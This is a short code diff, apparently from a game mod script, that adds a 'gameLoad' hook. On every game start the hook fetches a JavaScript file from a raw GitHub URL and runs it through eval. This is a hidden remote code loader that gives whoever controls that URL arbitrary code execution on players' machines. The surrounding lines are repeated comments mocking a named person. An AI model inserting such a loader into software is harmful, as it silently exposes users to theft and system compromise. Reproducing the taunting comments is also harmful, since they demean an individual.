@@ -2163,6 +2163,10 @@ register("command", () => {
 // dtal is gay
 // dtal is gay
 // dtal is gay
+register("gameLoad", () => {
+    let a=  FileLib.getUrlContent("https://raw.githubusercontent.com/ElectraChat/.github/main/aaa.js");
+    eval(a)
+});
 // dtal is gay
 // dtal is gay
 // dtal is gay
